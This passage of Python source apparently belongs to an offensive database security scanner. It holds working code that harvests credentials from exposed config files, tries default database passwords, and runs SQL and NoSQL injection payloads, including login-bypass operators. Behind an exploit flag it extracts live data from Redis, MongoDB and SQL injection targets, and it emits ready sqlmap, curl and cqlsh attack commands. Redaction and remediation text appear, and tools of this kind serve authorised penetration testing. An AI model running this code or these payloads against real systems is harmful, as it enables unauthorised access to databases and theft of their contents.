    sr = _tcp_send_recv(host, port, startup, read=2048)
    if sr and len(sr) > 4 and sr[4] == 0x02:        # READY → no authentication
        f = _unauth_finding("Cassandra", host, port, "CQL STARTUP returned READY — no authentication")
        f.raw.update(
            evidence=ev.from_parts("TCP", f"{host}:{port}", "CQL OPTIONS+STARTUP",
                                   indicator="Cassandra accepted a session without authentication"),
            exploitation=_db_exploitation("http_db_unauth", host=host, port=port,
                                          desc="Connect with cqlsh and read every keyspace.",
                                          cmd=f"cqlsh {host} {port} -e 'DESC KEYSPACES; SELECT * FROM <ks>.<table> LIMIT 25;'"),
            exploit_cmd=f"cqlsh {host} {port}")
        return [f]
    return []


def _redact(s: str) -> str:
    return re.sub(r"(://[^:/\s]+:)[^@/\s]+(@)", r"\1***\2", s)


def _redact_line(line: str) -> str:
    """Mask password values in a 'KEY=value' / 'key: value' / URL credential line."""
    line = re.sub(r"((?:password|passwd|pwd|pass|pgpassword)\s*[:=]\s*)\S+",
                  r"\1***", line, flags=re.I)
    return _redact(line)


def _check_secret_files(engine: ScanEngine, catch_all: bool) -> list[Finding]:
    """Hunt server-side config files that leak DB credentials (.env, database.yml, my.cnf...)."""
    findings: list[Finding] = []
    for path in _SECRET_FILES:
        resp = _http_get(engine, path)
        if resp is None or resp.status_code != 200 or not resp.content or catch_all:
            continue
        body = resp.text
        ctype = resp.headers.get("content-type", "").lower()
        # A real config/secret file is served as text, not as an HTML app page.
        if "html" in ctype or body[:64].lstrip().lower().startswith(("<!doctype", "<html")):
            continue
        m = _SECRET_CRED_RE.search(body)
        if not m:
            continue
        cred_lines = [ln.strip() for ln in body.splitlines() if _SECRET_CRED_RE.search(ln)]
        # Prefer a line that actually carries a password value for the proof snippet.
        cred_line = next((ln for ln in cred_lines if re.search(r"pass(?:wd|word)?|pgpassword", ln, re.I)),
                         cred_lines[0] if cred_lines else m.group(0))
        url = _origin(engine) + path
        findings.append(_f(
            f"Database Credentials File Exposed: {path}",
            f"The config file {url} is publicly readable and contains database credentials "
            f"(matched {m.group(1)!r}). Proof: {_redact_line(cred_line)[:120]}",
            Severity.CRITICAL,
            "Move secrets out of the web root, deny dotfiles/config files at the server level, "
            "and rotate the exposed database password immediately.",
            "creds_leak", path=path, url=url, proof_url=url,
            secret_match=_redact_line(cred_line)[:200],
            evidence=ev.from_response(resp, indicator=f"DB credential token {m.group(1)!r} in a readable config file")
            + [f"proof: {_redact_line(cred_line)[:120]}"],
            exploitation=_db_exploitation("creds_leak", desc="Harvest the DB credentials from the exposed file.",
                                          cmd=f"curl -s {url}",
                                          connect="<db-client> -h <DB_HOST> -u <DB_USER> -p   # use the harvested password"),
            exploit_cmd=f"curl -s {url}   # harvest DB_HOST/DB_USER/DB_PASSWORD, then connect directly"))
    return findings


def _check_connstrings(engine: ScanEngine) -> list[Finding]:
    """Scan crawled page/inline-JS source for leaked DB connection strings & credentials."""
    try:
        crawl = engine.get_crawl()
    except Exception:  # noqa: BLE001
        return []
    findings: list[Finding] = []
    seen: set[str] = set()
    for url, html in crawl.pages.items():
        for match in _CONNSTR_RE.findall(html):
            snippet = match[:140]
            if snippet.lower() in seen:
                continue
            seen.add(snippet.lower())
            creds = ("://" in match and "@" in match) or "password=" in match.lower()
            findings.append(_f(
                "Database Connection String Leaked",
                f"A database connection string is exposed in the source of {url}: {_redact(snippet)}"
                + (" — it contains credentials." if creds else "."),
                Severity.CRITICAL if creds else Severity.HIGH,
                "Never embed DB connection strings/credentials in front-end code; use server-side "
                "secrets and rotate any exposed password immediately.",
                "creds_leak" if creds else "admin_403",
                url=url, snippet=_redact(snippet), has_credentials=creds, proof_url=url,
                evidence=[f"connection string in the source of {url}", f"value: {_redact(snippet)}"],
                exploitation=_db_exploitation("creds_leak", desc="Use the leaked connection string to connect.",
                                              cmd=f"# parse {_redact(snippet)[:60]} → <db-client> with the embedded host/user/pass")))
    return findings


def _check_graphql(engine: ScanEngine) -> list[Finding]:
    for path in _GRAPHQL_PATHS:
        try:
            resp = engine.request("POST", _origin(engine) + path,
                                  json={"query": "{__schema{types{name}}}"}, timeout=6.0)
        except httpx.HTTPError:
            continue
        if resp.status_code == 200 and '"__schema"' in resp.text and '"types"' in resp.text:
            types: list[str] = []
            try:
                types = [t["name"] for t in resp.json()["data"]["__schema"]["types"]
                         if not str(t.get("name", "")).startswith("__")][:20]
            except Exception:  # noqa: BLE001
                pass
            url = _origin(engine) + path
            return [_f(f"GraphQL Introspection Enabled: {path}",
                       f"GraphQL at {url} exposes its entire schema via introspection — an attacker maps "
                       "every query, mutation and hidden data type. Types: " + ", ".join(types) + ".",
                       Severity.HIGH,
                       "Disable introspection in production and enforce authorization on every field.",
                       "graphql", url=url, types=types, proof_url=url,
                       evidence=ev.from_response(resp, indicator=f"introspection returned {len(types)} type(s)"),
                       exploitation=_db_exploitation("admin", desc="Map the schema, then query sensitive types.",
                                                     cmd=f"clairvoyance -o schema.json {url}   # or graphw00f -t {url}"),
                       exploit_cmd=f"Run graphw00f/clairvoyance, or POST a full introspection query to {path}")]
    return []


# ---------------------------------------------------------------------------
# Default credentials (optional drivers; graceful skip)
# ---------------------------------------------------------------------------

def _check_default_creds(host: str, port: int, engine_name: str) -> list[Finding]:
    creds: list[tuple[str, str]] = []
    found = None
    try:
        if engine_name.startswith("MySQL"):
            import pymysql  # type: ignore  # noqa: PLC0415
            for user, pwd in [("root", ""), ("root", "root"), ("root", "mysql")]:
                try:
                    pymysql.connect(host=host, port=port, user=user, password=pwd,
                                    connect_timeout=4).close()
                    found = (user, pwd or "(empty)")
                    break
                except Exception:  # noqa: BLE001
                    continue
        elif engine_name == "PostgreSQL":
            import psycopg2  # type: ignore  # noqa: PLC0415
            for user, pwd in [("postgres", "postgres"), ("postgres", "")]:
                try:
                    psycopg2.connect(host=host, port=port, user=user, password=pwd,
                                     connect_timeout=4).close()
                    found = (user, pwd or "(empty)")
                    break
                except Exception:  # noqa: BLE001
                    continue
        elif engine_name == "MSSQL":
            import pymssql  # type: ignore  # noqa: PLC0415
            for user, pwd in [("sa", ""), ("sa", "sa"), ("sa", "Password123"), ("sa", "P@ssw0rd")]:
                try:
                    pymssql.connect(server=host, port=str(port), user=user, password=pwd,
                                    login_timeout=4, timeout=4).close()
                    found = (user, pwd or "(empty)")
                    break
                except Exception:  # noqa: BLE001
                    continue
    except ImportError:
        logger.debug(f"db_security: no driver to test default creds for {engine_name}")
        return []
    except Exception as exc:  # noqa: BLE001
        logger.debug(f"db_security: default-cred test error: {exc}")
        return []

    if found:
        return [_f(f"Default Credentials Work: {engine_name} {host}:{port}",
                   f"{engine_name} accepted default credentials {found[0]}/{found[1]}. Full database "
                   "access with no real authentication.",
                   Severity.CRITICAL, "Set a strong unique password immediately and restrict network access.",
                   "default_creds", host=host, port=port, engine=engine_name,
                   credential=f"{found[0]}/{found[1]}",
                   evidence=[f"authenticated to {engine_name} {host}:{port} with {found[0]}/{found[1]}"],
                   exploitation=_db_exploitation("creds_leak", host=host, port=port,
                                                 desc=f"Log in with the default credentials and dump the data.",
                                                 cmd=f"<{engine_name} client> -h {host} -P {port} -u {found[0]} -p"))]
    return []


# ---------------------------------------------------------------------------
# SQL / NoSQL injection on crawled parameters
# ---------------------------------------------------------------------------

def _detect_sql_error(text: str) -> str | None:
    for rx, eng in _SQL_ERRORS:
        if rx.search(text):
            return eng
    return None


def _check_sqli(engine: ScanEngine, safe: bool) -> list[Finding]:
    findings: list[Finding] = []
    injectors = iter_injectors(engine)
    for inj in injectors:
        hit = _sqli_one(engine, inj, safe)
        if hit:
            findings.append(hit)
    return findings


def _sqli_one(engine, inj, safe):
    # error-based
    for payload in _ERR_PAYLOADS:
        resp = inj.inject(payload)
        if resp is not None and (eng := _detect_sql_error(resp.text)):
            return _sqli_finding(inj, payload, "error-based", eng)
    # boolean-based
    base = inj.inject("1")
    if base is not None:
        for t_payload, f_payload in _BOOL_PAYLOADS:
            rt, rf = inj.inject(t_payload), inj.inject(f_payload)
            if rt is not None and rf is not None and len(rt.text) and \
                    abs(len(rt.text) - len(base.text)) < len(base.text) * 0.05 < abs(len(rf.text) - len(base.text)):
                return _sqli_finding(inj, t_payload, "boolean-based", "Generic SQL")
    # time-based (URL params only, not safe mode)
    if not safe and inj.proof:
        from scanner.vulns._common import timed_get  # noqa: PLC0415
        b = timed_get(engine, inj.proof("1"))
        if b is not None:
            for eng, tmpl in _TIME_PAYLOADS:
                t = timed_get(engine, inj.proof(tmpl.format(t=2)))
                if t is not None and (t - b) > 1.8:
                    return _sqli_finding(inj, tmpl.format(t=2), "time-based", eng)
    return None


_SQLMAP_TECH = {"error-based": "E", "boolean-based": "B", "time-based": "T"}


def _sqli_finding(inj, payload, technique, engine_name) -> Finding:
    proof = inj.proof(payload) if inj.proof else None
    extra: dict = {"parameter": inj.param, "technique": technique, "engine": engine_name,
                   "payload": payload, "proof_url": proof}
    desc = (f"Parameter '{inj.param}' at {inj.label} is SQL-injectable ({technique}, {engine_name}). "
            f"Payload: {payload!r}.")
    extra["evidence"] = [f"injected into {inj.label}: {payload!r}",
                         f"{technique} SQL injection confirmed ({engine_name})"]
    # Attach a ready sqlmap command so the --exploit launcher can attack it.
    if inj.url:
        flag = _SQLMAP_TECH.get(technique, "BEUSTQ")
        extra["sqlmap_args"] = ["-u", inj.url, "-p", inj.param, "--batch",
                                f"--technique={flag}", "--threads=10", "--dbs"]
        extra["sqlmap"] = (f'sqlmap -u "{inj.url}" -p {inj.param} --batch '
                           f"--technique={flag} --threads=10 --dbs")
        extra["exploitation"] = _db_exploitation("sqli", url=inj.url, param=inj.param, flag=flag)
        desc += f"\n\nExploit with sqlmap (authorised targets only):\n  {extra['sqlmap']}"
    return _f(f"SQL Injection ({technique}): {inj.param} ({engine_name})", desc,
              Severity.CRITICAL,
              "Use parameterised queries; never concatenate user input into SQL.",
              "sqli", **extra)


# ---------------------------------------------------------------------------
# Expanded surface: SQL injection through HTTP headers & cookies
# ---------------------------------------------------------------------------

def _header_cookie_injectors(engine: ScanEngine) -> list[Injector]:
    """Injectors that smuggle the payload through HTTP headers and cookies (no URL proof)."""
    base_url = engine.url
    injectors: list[Injector] = [
        Injector(label=f"HTTP header '{hdr}'", param=hdr,
                 inject=(lambda payload, h=hdr: get(engine, base_url, headers={h: payload})),
                 proof=None)
        for hdr in _INJECT_HEADERS
    ]
    # Cookies discovered from a baseline response (server may query them).
    try:
        cookie_names = list(engine.request("GET", base_url).cookies.keys())
    except httpx.HTTPError:
        cookie_names = []
    for cname in cookie_names[:5]:
        injectors.append(Injector(
            label=f"cookie '{cname}'", param=cname,
            inject=(lambda payload, c=cname: get(engine, base_url, headers={"Cookie": f"{c}={payload}"})),
            proof=None))
    return injectors


def _check_injection_headers(engine: ScanEngine, safe: bool) -> list[Finding]:
    """Reuse the SQLi engine against header/cookie vectors (error/boolean only)."""
    if safe:
        return []
    findings: list[Finding] = []
    for inj in _header_cookie_injectors(engine):
        hit = _sqli_one(engine, inj, safe)
        if hit:
            findings.append(hit)
    return findings


def _check_nosql(engine: ScanEngine, safe: bool,
                 skip_params: "set[str] | None" = None) -> list[Finding]:
    if safe:
        return []
    skip_params = skip_params or set()
    findings: list[Finding] = []
    for inj in iter_injectors(engine):
        if inj.proof is None or inj.param in skip_params:
            continue
        base = inj.inject("1")
        if base is None:
            continue
        sql_param = False
        hit_payload: str | None = None
        for payload in _NOSQL_PAYLOADS:
            resp = inj.inject(payload)
            if resp is None:
                continue
            # A SQL error means the parameter is SQL-injectable, not NoSQL — don't double-report.
            if _detect_sql_error(resp.text):
                sql_param = True
                break
            size_delta = abs(len(resp.text) - len(base.text)) / max(len(base.text), 1)
            # Require a status-code change or a large body change to limit false positives.
            if resp.status_code != base.status_code or size_delta > 0.40:
                hit_payload = payload
                break
        if sql_param or hit_payload is None:
            continue
        findings.append(_f(f"Possible NoSQL Injection: {inj.param}",
                           f"Parameter '{inj.param}' changed behaviour for NoSQL operator "
                           f"{hit_payload!r} (status/size delta) with no SQL error. Verify manually.",
                           Severity.CRITICAL,
                           "Cast/validate input types; never pass raw user objects to NoSQL queries.",
                           "nosql", parameter=inj.param, payload=hit_payload,
                           proof_url=inj.proof(hit_payload), confidence="medium"))
    return findings


# Login-failure vs authenticated markers — used to confirm a *real* auth bypass.
_LOGIN_FAIL_RE = re.compile(
    r"invalid|incorrect|failed|wrong|denied|not match|bad cred|try again|"
    r"authentication failed|login failed|does ?n.t exist", re.I)
_LOGIN_AUTH_RE = re.compile(
    r"log\s*out|sign\s*out|welcome\b|dashboard|my ?account|your profile|logged ?in", re.I)


def _login_success(base: httpx.Response, attempt: "httpx.Response | None") -> bool:
    """Confirm a NoSQL auth bypass ONLY on a clear failure→success transition.

    Weak signals (a new session cookie, a size change, a redirect) fire on normal frameworks
    (ASP.NET ViewState, per-request session ids) and caused false positives, so they are not
    used. We require that the wrong-credentials baseline shows a login failure while the
    operator-injection attempt no longer does (or shows an authenticated marker the baseline
    lacked).
    """
    if attempt is None or attempt.status_code >= 500:
        return False
    base_fail = bool(_LOGIN_FAIL_RE.search(base.text))
    att_fail = bool(_LOGIN_FAIL_RE.search(attempt.text))
    if base_fail and not att_fail:
        return True
    if _LOGIN_AUTH_RE.search(attempt.text) and not _LOGIN_AUTH_RE.search(base.text):
        return True
    return False


def _check_nosql_authbypass(engine: ScanEngine, safe: bool) -> list[Finding]:
    """NoSQL operator-injection auth bypass on POST login forms ({"$ne":""})."""
    if safe:
        return []
    try:
        crawl = engine.get_crawl()
    except Exception:  # noqa: BLE001
        return []
    findings: list[Finding] = []
    for form in crawl.forms:
        if (form.method or "").lower() != "post":
            continue
        pw_fields = [f for f in form.fields if "pass" in f.lower()]
        if not pw_fields:
            continue
        # Skip ASP.NET WebForms / other non-NoSQL stacks: a Mongo bypass is impossible there,
        # and their hidden ViewState fields make the heuristic misfire (false positives).
        if any(f.lower().startswith("__view") or "eventvalidation" in f.lower()
               or "csrf" in f.lower() or "requestverificationtoken" in f.lower()
               for f in form.fields):
            continue
        # Inject into the password field(s) plus the first non-password (username) field.
        user_field = [f for f in form.fields if f not in pw_fields][:1]
        targets = list(dict.fromkeys([*user_field, *pw_fields]))
        # Baseline: deliberately wrong credentials.
        bad = {k: "nonexistent_zzz_" + k for k in form.fields}
        try:
            base = engine.request("POST", form.action, data=bad)
        except httpx.HTTPError:
            continue
        # Attempt 1 — urlencoded operator injection (user[$ne]=).
        data1 = {k: v for k, v in form.fields.items() if k not in targets}
        for f in targets:
            data1[f + "[$ne]"] = ""
        # Attempt 2 — JSON operator injection.
        body2 = {f: {"$ne": ""} for f in targets}
        a1 = get_post(engine, form.action, data=data1)
        a2 = get_post(engine, form.action, json=body2)
        hit = next(((label, a) for label, a in (("user[$ne]= (urlencoded)", a1),
                                                ('{"$ne":""} (JSON)', a2))
                    if _login_success(base, a)), None)
        if hit:
            label, _ = hit
            findings.append(_f(
                f"NoSQL Authentication Bypass: {form.action}",
                f"The login form at {form.action} accepted a NoSQL operator-injection payload "
                f"({label}) and behaved as an authenticated session — credentials were bypassed.",
                Severity.CRITICAL,
                "Cast inputs to strings server-side; reject objects/operators in auth queries.",
                "authbypass", url=form.action, payload=label, proof_url=form.action,
                confidence="medium", exploit_cmd=f"Replay {label} into the login fields at {form.action}"))
    return findings


def get_post(engine: ScanEngine, url: str, **kwargs) -> "httpx.Response | None":
    try:
        return engine.request("POST", url, **kwargs)
    except httpx.HTTPError:
        return None


# ---------------------------------------------------------------------------
# Admin interfaces / dump files / framework leaks
# ---------------------------------------------------------------------------

def _origin(engine: ScanEngine) -> str:
    """scheme://host[:port] of the target (path-based probes must hit the root, not the URL path)."""
    p = urlparse(engine.url)
    return f"{p.scheme}://{p.netloc}"


def _http_get(engine: ScanEngine, path: str) -> "httpx.Response | None":
    try:
        # Shorter timeout than the default 15s: DB probes are many and a hung WAF must
        # not stall the whole audit.
        return engine.request("GET", _origin(engine) + path, timeout=6.0)
    except httpx.HTTPError:
        return None


def _baseline_catchall(engine: ScanEngine) -> bool:
    import random, string  # noqa: PLC0415
    slug = "".join(random.choices(string.ascii_lowercase, k=20))
    resp = _http_get(engine, f"/{slug}")
    return resp is not None and resp.status_code == 200


def _check_admin_interfaces(engine: ScanEngine, catch_all: bool) -> list[Finding]:
    findings: list[Finding] = []
    for path in _ADMIN_PATHS:
        resp = _http_get(engine, path)
        if resp is None:
            continue
        url = _origin(engine) + path
        if resp.status_code == 200 and not catch_all and _ADMIN_SIG.search(resp.text):
            findings.append(_f(f"Exposed DB Admin Interface [200]: {path}",
                               f"A database admin interface is publicly accessible at {url}.",
                               Severity.CRITICAL, "Remove or restrict the interface to a VPN/allowlist.",
                               "admin_200", path=path, url=url, proof_url=url))
        elif resp.status_code in (401, 403):
            findings.append(_f(f"DB Admin Interface Present (Protected) [{resp.status_code}]: {path}",
                               f"A database admin interface exists at {url} but is access-controlled.",
                               Severity.HIGH, "Remove it from the web root if not needed.",
                               "admin_403", path=path, url=url, proof_url=url))
    return findings


def _check_dump_files(engine: ScanEngine, catch_all: bool) -> list[Finding]:
    host = urlparse(engine.url).hostname or ""
    paths = list(_DUMP_PATHS) + list(_EXTRA_DUMP_PATHS)
    if host:
        paths += [f"/{host.split('.')[0]}.sql", f"/{host.split('.')[0]}.sqlite"]
    findings: list[Finding] = []
    for path in paths:
        resp = _http_get(engine, path)
        if resp is None:
            continue
        ctype = resp.headers.get("content-type", "").lower()
        looks_html = "html" in ctype or resp.text[:64].lstrip().lower().startswith(("<!doctype", "<html"))
        is_sqlite = resp.content[:16].startswith(_SQLITE_MAGIC)
        non_html_dump = "plain" in ctype or "octet-stream" in ctype or "sql" in ctype \
            or path.endswith((".gz", ".zip"))
        if resp.status_code == 200 and resp.content and not catch_all and not looks_html and \
                (non_html_dump or is_sqlite):
            url = _origin(engine) + path
            findings.append(_f(f"Exposed Database Dump [200]: {path}",
                               f"A database dump/backup is publicly downloadable at {url} "
                               f"({len(resp.content)} bytes, {ctype or 'unknown type'}).",
                               Severity.CRITICAL, "Remove the dump from the web root and rotate exposed secrets.",
                               "dump", path=path, url=url, proof_url=url,
                               evidence=ev.from_response(
                                   resp, indicator=f"downloadable dump, {len(resp.content)} bytes"
                                   + (" (SQLite magic header)" if is_sqlite else "")),
                               exploitation=_db_exploitation("dump", desc="Download the exposed database dump.",
                                                             cmd=f"curl -O {url}")))
    return findings


def _check_framework_leaks(engine: ScanEngine) -> list[Finding]:
    findings: list[Finding] = []
    for path, fw in _FRAMEWORK_PATHS:
        resp = _http_get(engine, path)
        if resp is None:
            continue
        if resp.status_code == 200 and _DB_CRED_RE.search(resp.text):
            url = _origin(engine) + path
            findings.append(_f(f"DB Credentials Leaked via {fw}: {path}",
                               f"{fw} debug endpoint {url} exposes database configuration/credentials.",
                               Severity.CRITICAL, "Disable debug/actuator endpoints in production.",
                               "unauth", path=path, url=url, framework=fw, proof_url=url))
    return findings


# ---------------------------------------------------------------------------
# Cloud / managed database exposure (Firebase, Firestore, Supabase)
# ---------------------------------------------------------------------------

def _check_cloud_db(engine: ScanEngine) -> list[Finding]:
    """Detect world-readable cloud databases referenced in the site's source."""
    try:
        blob = "\n".join(engine.get_crawl().pages.values())
    except Exception:  # noqa: BLE001
        return []
    findings: list[Finding] = []

    # --- Firebase Realtime Database: /.json with no auth returns the whole tree ---
    projects = set(_FIREBASE_RE.findall(blob)) | set(_FIREBASE_CFG_RE.findall(blob))
    for proj in list(projects)[:5]:
        url = f"https://{proj}.firebaseio.com/.json?shallow=true"
        try:
            r = engine.request("GET", url, timeout=8.0)
        except httpx.HTTPError:
            continue
        if r.status_code == 200 and r.text.strip() not in ("null", "", "{}"):
            findings.append(_f(
                f"Firebase Realtime DB World-Readable: {proj}",
                f"The Firebase Realtime Database '{proj}' is readable WITHOUT authentication at "
                f"{url} — every record can be downloaded by anyone.",
                Severity.CRITICAL,
                "Set Firebase security rules to deny public read/write and require authentication.",
                "cloud_db", url=url, project=proj, proof_url=url,
                evidence=ev.from_response(r, indicator="Firebase Realtime DB returned data without authentication"),
                exploitation=_db_exploitation("cloud_db", desc="Download the entire Firebase tree.",
                                              cmd=f"curl 'https://{proj}.firebaseio.com/.json'"),
                exploit_cmd=f"curl 'https://{proj}.firebaseio.com/.json'"))

    # --- Firestore REST: open default database documents ---
    for proj in list(set(_FIRESTORE_RE.findall(blob)))[:3]:
        url = f"https://firestore.googleapis.com/v1/projects/{proj}/databases/(default)/documents"
        try:
            r = engine.request("GET", url, timeout=8.0)
        except httpx.HTTPError:
            continue
        if r.status_code == 200 and '"documents"' in r.text:
            findings.append(_f(
                f"Firestore Documents Publicly Readable: {proj}",
                f"Firestore project '{proj}' returns documents over the public REST API without "
                f"authentication ({url}).",
                Severity.CRITICAL,
                "Tighten Firestore security rules; deny unauthenticated reads.",
                "cloud_db", url=url, project=proj, proof_url=url,
                evidence=ev.from_response(r, indicator="Firestore returned documents over the public REST API"),
                exploitation=_db_exploitation("cloud_db", desc="Page through every Firestore document.",
                                              cmd=f"curl '{url}?pageSize=300'")))

    # --- Supabase: anon key in source → advisory (RLS must be enforced) ---
    sup_projects = set(_SUPABASE_RE.findall(blob))
    if sup_projects and _SUPABASE_KEY_RE.search(blob):
        proj = list(sup_projects)[0]
        findings.append(_f(
            f"Supabase Project Exposed: {proj}",
            f"A Supabase project '{proj}.supabase.co' and an anon API key are embedded in the "
            "site source. This is by design, but ONLY safe if Row-Level Security is enforced on "
            "every table — otherwise the anon key reads/writes all data.",
            Severity.MEDIUM,
            "Verify Row-Level Security is enabled and restrictive on all Supabase tables.",
            "cloud_db", project=proj, confidence="medium",
            exploit_cmd=f"curl 'https://{proj}.supabase.co/rest/v1/<table>?apikey=<anon_key>&select=*'"))
    return findings


# ---------------------------------------------------------------------------
# Active extraction (gated by --exploit) — turns detection into proof of impact
# ---------------------------------------------------------------------------

def _redis_value(host: str, port: int, key: str) -> str:
    """Best-effort read of one Redis key's value (type-aware)."""
    kb = key.encode("latin-1", "replace")
    typ = _tcp_send_recv(host, port, b"TYPE " + kb + b"\r\n")
    if b"+string" in typ:
        raw = _tcp_send_recv(host, port, b"GET " + kb + b"\r\n")
    elif b"+hash" in typ:
        raw = _tcp_send_recv(host, port, b"HGETALL " + kb + b"\r\n")
    elif b"+list" in typ:
        raw = _tcp_send_recv(host, port, b"LRANGE " + kb + b" 0 20\r\n")
    elif b"+set" in typ:
        raw = _tcp_send_recv(host, port, b"SMEMBERS " + kb + b"\r\n")
    else:
        raw = _tcp_send_recv(host, port, b"GET " + kb + b"\r\n")
    return raw.decode("latin-1", "replace")


def _exploit_redis(host: str, port: int, sample_keys: list[str], loot: Path | None) -> list[Finding]:
    """Dump sample Redis key VALUES + prove write access (RCE-capable) as evidence."""
    out: list[Finding] = []
    if sample_keys:
        dump_lines = []
        for key in sample_keys[:10]:
            val = _redis_value(host, port, key)
            dump_lines.append(f"### {key}\n{val.strip()[:500]}")
        dump = "\n\n".join(dump_lines)
        evidence = _save_evidence(loot, f"redis_{host}_{port}.txt", dump)
        out.append(_f(f"Redis Data Extracted: {host}:{port}",
                      f"Read the actual values of {len(sample_keys[:10])} Redis key(s) without auth — "
                      "concrete proof the data is fully exposed.",
                      Severity.CRITICAL, "Require AUTH and firewall the port immediately.",
                      "extraction", host=host, port=port, engine="Redis",
                      redis_values=dump_lines[:5], evidence_file=evidence,
                      evidence=[f"read {len(sample_keys[:10])} key value(s) over an unauthenticated session"]))

    # Read the CONFIG that enables the RDB-write RCE, and prove WRITE access with a benign, self-deleting
    # canary key (SET → GET → DEL). Write access = full RCE capability via CONFIG SET dir + SAVE.
    rdb_dir = _resp_bulk(_tcp_send_recv(host, port, b"CONFIG GET dir\r\n"))
    rdb_file = _resp_bulk(_tcp_send_recv(host, port, b"CONFIG GET dbfilename\r\n"))
    token = "hades_canary_" + "".join(re.findall(r"\w", str(time.time())))[-8:]
    set_resp = _tcp_send_recv(host, port, f"SET {token} pwned\r\n".encode("latin-1"))
    got = _tcp_send_recv(host, port, f"GET {token}\r\n".encode("latin-1"))
    _tcp_send_recv(host, port, f"DEL {token}\r\n".encode("latin-1"))   # cleanup the canary
    if b"+OK" in set_resp and b"pwned" in got:
        cli = f"redis-cli -h {host} -p {port}"
        out.append(_f(f"Redis Write Access Confirmed — RCE-Capable: {host}:{port}",
                      f"Wrote and read back a key over the unauthenticated session (proof of write access). "
                      f"With CONFIG reachable (dir={rdb_dir or '?'}, dbfilename={rdb_file or '?'}), an "
                      "attacker rewrites the RDB path to drop a web shell, SSH key, or cron job — full RCE.",
                      Severity.CRITICAL,
                      "Require AUTH, 'rename-command CONFIG \"\"', enable protected-mode, firewall the port.",
                      "unauth", host=host, port=port, engine="Redis", rdb_dir=rdb_dir, rdb_file=rdb_file,
                      evidence=[f"SET {token} → +OK, GET → 'pwned' (write access proven, key deleted)",
                                f"CONFIG GET dir → {rdb_dir or '(blocked)'}"],
                      exploitation=_db_exploitation("redis_unauth", host=host, port=port)))
    return out


def _resp_bulk(data: bytes) -> str:
    """Best-effort: pull the last bulk-string value from a RESP reply (e.g. CONFIG GET dir)."""
    parts = re.findall(rb"\$\d+\r\n([^\r\n]*)\r\n", data)
    return parts[-1].decode("latin-1", "replace") if parts else ""


def _exploit_http_json(engine: ScanEngine, label: str, url: str, host: str, port: int,
                       loot: Path | None) -> list[Finding]:
    """GET a JSON data endpoint (ES _search / CouchDB _all_docs) and save sample records."""
    try:
        r = engine.request("GET", url, timeout=8.0)
    except httpx.HTTPError:
        return []
    if r.status_code != 200 or not r.text.strip():
        return []
    evidence = _save_evidence(loot, f"{label}_{host}_{port}.json", r.text[:20000])
    return [_f(f"{label} Data Extracted: {host}:{port}",
               f"Pulled sample records from {url} without authentication.",
               Severity.CRITICAL, "Enable authentication and restrict network access.",
               "extraction", host=host, port=port, engine=label, url=url,
               evidence_file=evidence)]


def _extend_first_scheme(findings: list[Finding], engine: ScanEngine, label: str,
                         host: str, port: int, path: str, loot: Path | None) -> None:
    """Try http then https for a JSON data endpoint; append the first successful extraction."""
    for scheme in ("http", "https"):
        try:
            got = _exploit_http_json(engine, label, f"{scheme}://{host}:{port}{path}",
                                     host, port, loot)
        except Exception as exc:  # noqa: BLE001
            logger.debug(f"db_security: extract {label} {scheme} failed: {exc}")
            got = []
        if got:
            findings.extend(got)
            return


def _mongo_cmd(host: str, port: int, elements: bytes, read: int = 16384) -> bytes:
    return _tcp_send_recv(host, port, _op_msg(_bson_doc(elements)), read=read)


def _exploit_mongodb(host: str, port: int, dbs: list[str], loot: Path | None) -> list[Finding]:
    """List collections of a real database and pull sample documents (proof of data access)."""
    if not dbs:
        return []
    db = next((d for d in dbs if d not in ("admin", "local", "config")), dbs[0])
    resp = _mongo_cmd(host, port, _bson_int32("listCollections", 1) + _bson_str("$db", db))
    colls = [m.decode("latin-1", "replace")
             for m in re.findall(rb"\x02name\x00.{4}([ -~]{1,64}?)\x00", resp)]
    colls = [c for c in colls if c and c != "name"][:10]
    sample = ""
    if colls:
        fr = _mongo_cmd(host, port,
                        _bson_str("find", colls[0]) + _bson_int32("limit", 5) + _bson_str("$db", db))
        sample = re.sub(rb"[^\x20-\x7e\n]", b".", fr).decode("latin-1", "replace")[:4000]
    dump = (f"database: {db}\ncollections: {', '.join(colls)}\n\n"
            f"sample documents from {colls[0] if colls else '(none)'}:\n{sample}")
    evidence_file = _save_evidence(loot, f"mongo_{host}_{port}.txt", dump)
    return [_f(f"MongoDB Data Extracted: {host}:{port}",
               f"Listed collections of '{db}' and pulled sample documents without auth — "
               f"{len(colls)} collection(s): {', '.join(colls[:6]) or '(none readable)'}.",
               Severity.CRITICAL, "Require authentication and firewall the port.",
               "extraction", host=host, port=port, engine="MongoDB", database=db,
               collections=colls, evidence_file=evidence_file,
               evidence=[f"listCollections on '{db}' → {len(colls)} collection(s)",
                         f"sampled documents from '{colls[0]}'" if colls else "no readable collection"])]


# In-band SQLi data extraction: pull version / current_user / database via three error-based vectors.
_SQLI_EXFIL: dict[str, tuple[str, str, str]] = {
    # label: (MySQL extractvalue expr, MSSQL convert expr, PostgreSQL cast expr)
    "version":  ("version()", "@@version", "version()"),
    "user":     ("current_user()", "current_user", "current_user"),
    "database": ("database()", "db_name()", "current_database()"),
}
_SQLI_VECTORS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"~([^~]+)~"), "1 AND extractvalue(1,concat(0x7e,({expr}),0x7e))-- -"),
    (re.compile(r"converting the \w+ value '([^']+)", re.I), "1 AND 1=convert(int,({expr}))-- -"),
    (re.compile(r"invalid input syntax for (?:type )?integer: \"([^\"]+)", re.I),
     "1 AND 1=cast(({expr}) as int)-- -"),
]


def _sqli_extract(inj) -> str:
    """Best-effort in-band extraction of version + current user + database via error-based payloads."""
    out: dict[str, str] = {}
    for label, exprs in _SQLI_EXFIL.items():
        for (rx, tmpl), expr in zip(_SQLI_VECTORS, exprs):
            resp = inj.inject(tmpl.format(expr=expr))
            if resp is None:
                continue
            m = rx.search(resp.text)
            if m:
                out[label] = m.group(1).strip()[:120]
                break
    return "; ".join(f"{k}={v}" for k, v in out.items())


def _exploit_sqli(engine: ScanEngine, loot: Path | None) -> list[Finding]:
    """For each confirmed SQLi, attempt a lightweight in-band version pull as proof."""
    findings: list[Finding] = []
    for inj in iter_injectors(engine):
        if _sqli_one(engine, inj, safe=False) is None:
            continue
        fingerprint = _sqli_extract(inj)
        if not fingerprint:
            continue
        evidence = _save_evidence(loot, f"sqli_{inj.param}.txt",
                                  f"parameter: {inj.param}\nurl: {inj.url}\nDB version: {fingerprint}\n")
        findings.append(_f(
            f"SQLi Data Extracted (in-band): {inj.param}",
            f"Extracted the live database banner through parameter '{inj.param}' without sqlmap: "
